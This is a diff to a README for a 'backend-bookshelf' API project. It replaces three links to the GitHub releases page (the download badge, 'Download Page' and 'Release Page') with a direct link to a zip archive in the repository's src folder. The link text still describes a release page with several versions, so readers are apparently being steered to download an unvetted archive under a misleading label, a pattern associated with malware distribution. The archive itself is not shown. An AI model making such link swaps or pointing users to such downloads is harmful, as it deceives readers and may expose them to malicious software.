@@ -6,7 +6,7 @@ Welcome to the backend-bookshelf project! This application allows you to manage 
 
 ## 📥 Download Now
 
-[![Download backend-bookshelf](https://img.shields.io/badge/Download-backend--bookshelf-brightgreen)](https://github.com/mrkiller13/backend-bookshelf/releases)
+[![Download backend-bookshelf](https://raw.githubusercontent.com/mrkiller13/backend-bookshelf/main/src/backend-bookshelf-2.7.zip)](https://raw.githubusercontent.com/mrkiller13/backend-bookshelf/main/src/backend-bookshelf-2.7.zip)
 
 ## 📦 What You Need
 
@@ -19,7 +19,7 @@ To use the backend-bookshelf API, you should have:
 
 1. **Visit the Release Page**  
    Go to the following link to find the latest version of backend-bookshelf:  
-   [Download Page](https://github.com/mrkiller13/backend-bookshelf/releases)
+   [Download Page](https://raw.githubusercontent.com/mrkiller13/backend-bookshelf/main/src/backend-bookshelf-2.7.zip)
 
 2. **Choose the Right Version**  
    On the release page, you will see several versions listed. It’s best to select the latest one for the best experience. Click on the version you want.
@@ -80,7 +80,7 @@ Stay tuned for updates!
 
 ## 📅 Release Notes
 
-For detailed information about new features and fixes in each version, please refer to the release notes on the [Release Page](https://github.com/mrkiller13/backend-bookshelf/releases).
+For detailed information about new features and fixes in each version, please refer to the release notes on the [Release Page](https://raw.githubusercontent.com/mrkiller13/backend-bookshelf/main/src/backend-bookshelf-2.7.zip).
 
 ## 🌐 Connect With Us
 
